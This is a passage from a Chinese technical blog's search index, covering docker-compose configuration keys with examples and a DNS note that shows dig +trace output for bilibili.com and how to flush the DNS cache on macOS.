class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  docker docker-compose <span class="hljs-keyword">up</span> <br>Creating network <span class="hljs-string">&quot;docker_default&quot;</span> with the default driver<br>Pulling pgsql (postgre<span class="hljs-variable">s:12</span>-alpine)...<br><span class="hljs-number">12</span>-alpine: Pulling from library/postgres<br><span class="hljs-number">9</span>b18e9b68314: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">75</span>aada9edfc5: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">820773693750</span>: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">83</span>dc43929537: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">92</span>e2c19af124: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">52</span>f242e5c209: Pull <span class="hljs-built_in">complete</span><br>e0a8c8565c42: Pull <span class="hljs-built_in">complete</span><br>a424ab832487: Pull <span class="hljs-built_in">complete</span><br>Digest: <span class="hljs-built_in">sha256</span>:<span class="hljs-number">55</span>fb7ba926381c2ac1f8f58bb181dd932f140aa467c3097a07c6815648dbc5e2<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> postgre<span class="hljs-variable">s:12</span>-alpine<br>Creating docker_pgsql_1 ... done<br>Attaching <span class="hljs-keyword">to</span> docker_pgsql_1<br><br>➜  ~ docker <span class="hljs-keyword">ps</span><br>CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS          PORTS      NAMES<br><span class="hljs-number">34264</span>c6a3d67   postgre<span class="hljs-variable">s:12</span>-alpine   <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">55</span> seconds ago   Up <span class="hljs-number">54</span> seconds   <span class="hljs-number">5432</span>/tcp   docker_pgsql_1<br><br></code></pre></td></tr></table></figure><h3 id="depends-on"><a href="#depends-on" class="headerlink" title="depends_on"></a>depends_on</h3><p>设置依赖关系</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.</span><br>    <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">redis</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">db</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres</span><br></code></pre></td></tr></table></figure><p>docker-compose up：按照依赖关系启动服务，例如：先启动db和redis，再启动web，但是并不是说必须等db和redis启动完成再启动web</p><p>docker-compose up SERVICE：自动包含指定SERVER的依赖项</p><p>docker-compose stop ：按照依赖关系停止服务</p><h3 id="ports"><a href="#ports" class="headerlink" title="ports"></a>ports</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">gitlab</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">vulhub/gitlab:13.10.1</span><br>  <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">postgresql</span><br>  <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:80&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;10022:22&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;443&quot;</span><br></code></pre></td></tr></table></figure><p>绑定容器的8080到主机的80</p><p>绑定容器的443到主机的任意端口，取决于容器启动时的随机端口</p><h3 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a>volumes</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">postgresql</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres:11.9-alpine</span><br>    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=gitlab</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=password</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_DB=gitlabhq_production</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">DB_EXTENSION=pg_trgm</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">./load-extensions.sh:/docker-entrypoint-initdb.d/load-extensions.sh</span><br></code></pre></td></tr></table></figure><p>主机文件或数据卷挂载到容器中</p><h3 id="command"><a href="#command" class="headerlink" title="command"></a>command</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">namenode</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">vulhub/hadoop:2.8.1</span><br>  <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">HDFS_CONF_dfs_namenode_name_dir=file:///hadoop/dfs/name</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">CLUSTER_NAME=vulhub</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">HDFS_CONF_dfs_replication=1</span><br>  <span class="hljs-attribute">command</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/namenode.sh</span><br></code></pre></td></tr></table></figure><p>覆盖容器启动的默认命令</p><h3 id="healthcheck"><a href="#healthcheck" class="headerlink" title="healthcheck"></a>healthcheck</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">healthcheck:</span><br><span class="hljs-symbol">  test:</span> [<span class="hljs-string">&quot;CMD&quot;</span>, <span class="hljs-string">&quot;pg_isready&quot;</span>, <span class="hljs-string">&quot;-U&quot;</span>, <span class="hljs-string">&quot;airflow&quot;</span>] <span class="hljs-meta">#设置检查程序</span><br><span class="hljs-symbol">  interval:</span> <span class="hljs-number">1</span>m5s <span class="hljs-meta">#设置检测间隔</span><br><span class="hljs-symbol">  retries:</span> <span class="hljs-number">5</span> <span class="hljs-meta">#设置重试次数</span><br><span class="hljs-symbol">  timeout:</span> <span class="hljs-number">10</span> <span class="hljs-meta">#设置超时时间</span><br><span class="hljs-symbol">  start_period:</span> <span class="hljs-number">1</span>m40s <span class="hljs-meta">#设置程序启动多久后开始检测</span><br></code></pre></td></tr></table></figure><h3 id="container-name"><a href="#container-name" class="headerlink" title="container_name"></a>container_name</h3><p>指定容器名称，而非默认生成的名称</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">container_name: <span class="hljs-keyword">my</span>-container<br></code></pre></td></tr></table></figure><h3 id="devices"><a href="#devices" class="headerlink" title="devices"></a>devices</h3><p>指定设备映射列表</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">devices:</span> <br>    - <span class="hljs-string">&quot;/dev/ttyUSB0:/dev/ttyUSB0&quot;</span><br></code></pre></td></tr></table></figure><h3 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h3><p>自定义DNS服务器，可以为单个值，也可以为列表</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">dns</span><span class="hljs-punctuation">:</span> <span class="hljs-string">8.8.8.8</span><br><br><span class="hljs-attribute">dns</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">8.8.8.8</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">114.114.114.114</span><br></code></pre></td></tr></table></figure><h3 id="dns-search"><a href="#dns-search" class="headerlink" title="dns_search"></a>dns_search</h3><p>自定义DNS搜索域，可以为单个值，也可以为列表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dns_search: ns1<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span><br><br>dns_search: <br>    - ns2<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span><br>    - ns3<span class="hljs-selector-class">.test</span>.com<br></code></pre></td></tr></table></figure><h3 id="env-file"><a href="#env-file" class="headerlink" title="env_file"></a>env_file</h3><p>从文件中添加环境变量</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">env_file</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.env</span><br><br><span class="hljs-attribute">env_file</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">envfile2.env</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">./envfile3.env</span><br><br></code></pre></td></tr></table></figure><h3 id="expose"><a href="#expose" class="headerlink" title="expose"></a>expose</h3><p>暴露端口，但不映射到宿主机，也就是说只有内部可使用</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">expose:</span> <br>    - <span class="hljs-string">&quot;3333&quot;</span><br>    - <span class="hljs-string">&quot;6666&quot;</span><br></code></pre></td></tr></table></figure><h3 id="extra-hosts"><a href="#extra-hosts" class="headerlink" title="extra_hosts"></a>extra_hosts</h3><p>添加主机名映射，在容器&#x2F;etc&#x2F;hosts中创建主机名和IP绑定关系</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">extra_hosts:</span> <br>     - <span class="hljs-string">&quot;newhost:1.1.1.1&quot;</span><br>     - <span class="hljs-string">&quot;oldhost:2.2.2.2&quot;</span><br></code></pre></td></tr></table></figure><h3 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h3><p>服务日志记录配置</p><p>di r</p><h3 id="build"><a href="#build" class="headerlink" title="build"></a>build</h3><p>指定镜像构建上下文路径</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dns_record_operation</title>
    <link href="/2024/02/06/network/dns/dns_record_operation/"/>
    <url>/2024/02/06/network/dns/dns_record_operation/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>对常见的DNS记录及操作学习总结</p><h1 id="常见DNS记录"><a href="#常见DNS记录" class="headerlink" title="常见DNS记录"></a>常见DNS记录</h1><h2 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h2><p>223.5.5.5</p><h1 id="常见通用操作"><a href="#常见通用操作" class="headerlink" title="常见通用操作"></a>常见通用操作</h1><h2 id="dig-trace-查询"><a href="#dig-trace-查询" class="headerlink" title="dig trace 查询"></a>dig trace 查询</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><strong>dig +trace domain</strong></p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>1、直接从根域名服务器开始查询</p><p>2、本机代替递归服务器（本地DNS服务器）完成迭代查询</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>1、本地设备向根域名服务器（.） 查询 bilibili.com</p><p><img src="/image-20241225191304588.png" alt="image-20241225191304588"></p><p>2、根域名服务器识别为.com顶级域，告知需要去顶级域名服务器（.com)查询，并将顶级域名服务器返回给本地设备</p><p><img src="/image-20241225191338413.png" alt="image-20241225191338413"></p><p>3、本地设备又向顶级域名服务器请求查询bilibili.com</p><p><img src="/image-20241225191403683.png" alt="image-20241225191403683"></p><p>4、.com顶级域名服务器没有bilibili.com记录，告知需要去查询的域名服务器</p><p><img src="/image-20241225191431654.png" alt="image-20241225191431654"></p><p>5、本地设备再次向上一步请求返回的域名服务器发起请求</p><p><img src="/image-20241225191451787.png" alt="image-20241225191451787"></p><p>6、返回查询结果</p><p><img src="/image-20241225191523680.png" alt="image-20241225191523680"></p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs mercury">root@iZbp1191gh7vw52537lyxrZ:~# dig +<span class="hljs-keyword">trace</span> bilibili.com<br><br>; &lt;&lt;&gt;&gt; DiG <span class="hljs-number">9.18</span>.<span class="hljs-number">18</span>-<span class="hljs-number">0</span>ubuntu0.<span class="hljs-number">22.04</span>.<span class="hljs-number">2</span>-Ubuntu &lt;&lt;&gt;&gt; +<span class="hljs-keyword">trace</span> bilibili.com<br>;; global options: +cmd<br>.<span class="hljs-number">9</span>INNSf.root-servers.net.<br>.<span class="hljs-number">9</span>INNSd.root-servers.net.<br>.<span class="hljs-number">9</span>INNSg.root-servers.net.<br>.<span class="hljs-number">9</span>INNSh.root-servers.net.<br>.<span class="hljs-number">9</span>INNSa.root-servers.net.<br>.<span class="hljs-number">9</span>INNSc.root-servers.net.<br>.<span class="hljs-number">9</span>INNSk.root-servers.net.<br>.<span class="hljs-number">9</span>INNSb.root-servers.net.<br>.<span class="hljs-number">9</span>INNSl.root-servers.net.<br>.<span class="hljs-number">9</span>INNSm.root-servers.net.<br>.<span class="hljs-number">9</span>INNSj.root-servers.net.<br>.<span class="hljs-number">9</span>INNSi.root-servers.net.<br>.<span class="hljs-number">9</span>INNSe.root-servers.net.<br>;; Received <span class="hljs-number">239</span> bytes from <span class="hljs-number">127.0</span>.<span class="hljs-number">0.53</span>#<span class="hljs-number">53</span>(<span class="hljs-number">127.0</span>.<span class="hljs-number">0.53</span>) in <span class="hljs-number">0</span> ms<br><br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">7</span>fe::<span class="hljs-number">53</span>#<span class="hljs-number">53</span>(<span class="hljs-number">2001</span>:<span class="hljs-number">7</span>fe::<span class="hljs-number">53</span>) for bilibili.com failed: network unreachable.<br>com.<span class="hljs-number">172800</span>INNSa.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSb.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSc.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSd.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSe.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSf.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSg.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSh.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSi.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSj.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSk.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSl.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSm.gtld-servers.net.<br>com.<span class="hljs-number">86400</span>INDS<span class="hljs-number">19718</span> <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">8</span>ACBB0CD28F41250A80A491389424D341522D946B0DA0C0291F2D3D7 <span class="hljs-number">71</span>D7805A<br>com.<span class="hljs-number">86400</span>INRRSIGDS <span class="hljs-number">8</span> <span class="hljs-number">1</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240326050000</span> <span class="hljs-number">20240313040000</span> <span class="hljs-number">30903</span> . HMM7P1NYHa5RzV8Iqk5Kko4+/<span class="hljs-number">86</span>zW+tj+amxZiFP6qFZibjGiZ0XW4Nw gToWas+AVxHF+a73XU/<span class="hljs-number">0</span>mSdL6N0xpyabRsyYYXAYaZ4lZ9W1nST5DclJ hpyGcN6bP8+fm1VKLM5wXYuZ6tyeQuvDA3g8RfsN8B5q1CT31dU6vlyL <span class="hljs-number">8</span>NfbTTSDzYnH4zZzLpojJZ5dmW6Ua3oNiFitK4Ri+<span class="hljs-number">2</span>aOtv81WBLRqNHI WjRRbiP5JBAZDAj+iV+vQATwmH2gDxXBe6WN1KTbzcV7Nc9ds0l+B1Oy SF4zKaRP3wu3P0IyMzwDT63W76yCsesmW1+SIJpweI2HLA9MBx/+DZmZ iz7i6Q<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br>;; Received <span class="hljs-number">1172</span> bytes from <span class="hljs-number">198.97</span>.<span class="hljs-number">190.53</span>#<span class="hljs-number">53</span>(h.root-servers.net) in <span class="hljs-number">104</span> ms<br><br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:<span class="hljs-number">39</span>c1::<span class="hljs-number">30</span>#<span class="hljs-number">53</span>(<span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:<span class="hljs-number">39</span>c1::<span class="hljs-number">30</span>) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:d2d::<span class="hljs-number">30</span>#<span class="hljs-number">53</span>(<span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:d2d::<span class="hljs-number">30</span>) for bilibili.com failed: network unreachable.<br>bilibili.com.<span class="hljs-number">172800</span>INNSns3.dnsv5.com.<br>bilibili.com.<span class="hljs-number">172800</span>INNSns4.dnsv5.com.<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. <span class="hljs-number">86400</span> IN NSEC3 <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> - CK0Q2D6NI4I7EQH8NA30NS61O48UL8G5 NS SOA RRSIG DNSKEY NSEC3PARAM<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. <span class="hljs-number">86400</span> IN RRSIG NSEC3 <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240317052456</span> <span class="hljs-number">20240310041456</span> <span class="hljs-number">4534</span> com. nDsu/HWipq9WrDO772lGr5Rm0BGksazMNQ4BCktOTsLTqadXRbTc8Tx8 W1gAunMnPlgJUg7EzY+Bu0NR3W4cig<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br><span class="hljs-number">34</span>N8HDRIDRS931JVPDDJA5QLVPMOGVUB.com. <span class="hljs-number">86400</span> IN NSEC3 <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> - <span class="hljs-number">34</span>N8VR2QIA8E6FQT7AUGCM6FARONEELO NS DS RRSIG<br><span class="hljs-number">34</span>N8HDRIDRS931JVPDDJA5QLVPMOGVUB.com. <span class="hljs-number">86400</span> IN RRSIG NSEC3 <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240319051354</span> <span class="hljs-number">20240312040354</span> <span class="hljs-number">4534</span> com. C1pama7SsZ1nj2soxDM0wG3vGlXjMB1Mn20jEnBOAVmXFgoPN+bQpoXs UemGxrKrQe83kf10kN/<span class="hljs-number">52</span>ul4JYgIrQ<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br>;; Received <span class="hljs-number">784</span> bytes from <span class="hljs-number">192.52</span>.<span class="hljs-number">178.30</span>#<span class="hljs-number">53</span>(k.gtld-servers.net) in <span class="hljs-number">164</span> ms<br><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">8.134</span>.<span class="hljs-number">50.24</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">47.103</span>.<span class="hljs-number">24.173</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">119.3</span>.<span class="hljs-number">70.188</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">139.159</span>.<span class="hljs-number">241.37</span><br>bilibili.com.<span class="hljs-number">86400</span>INNSns3.dnsv5.com.<br>bilibili.com.<span class="hljs-number">86400</span>INNSns4.dnsv5.com.<br>;; Received <span class="hljs-number">159</span> bytes from <span class="hljs-number">1.12</span>.<span class="hljs-number">0.16</span>#<span class="hljs-number">53</span>(ns4.dnsv5.com) in <span class="hljs-number">16</span> ms<br></code></pre></td></tr></table></figure><h2 id="清空DNS缓存"><a href="#清空DNS缓存" class="headerlink" title="清空DNS缓存"></a>清空DNS缓存</h2><h3 id="Mac电脑"><a href="#Mac电脑" class="headerlink" title="Mac电脑"></a>Mac电脑</h3><p><strong>sudo killall -HUP mDNSResponder</strong></p><h1 id="DNS安全加固"><a href="#DNS安全加固" class="headerlink" title="DNS安全加固"></a>DNS安全加固</h1><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><p>【1】 dnsviz.net</p><p><a href="https://dnsviz.net/d/pizzaseo.com/dnssec/">https://dnsviz.net/d/pizzaseo.com/dnssec/</a></p><p>【2】DNSSEC 2024-01-30 13:38:58</p><p><a href="https://help.aliyun.com/document_detail/149662.html">https://help.aliyun.com/document_detail/149662.html</a></p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>dns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>dns</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
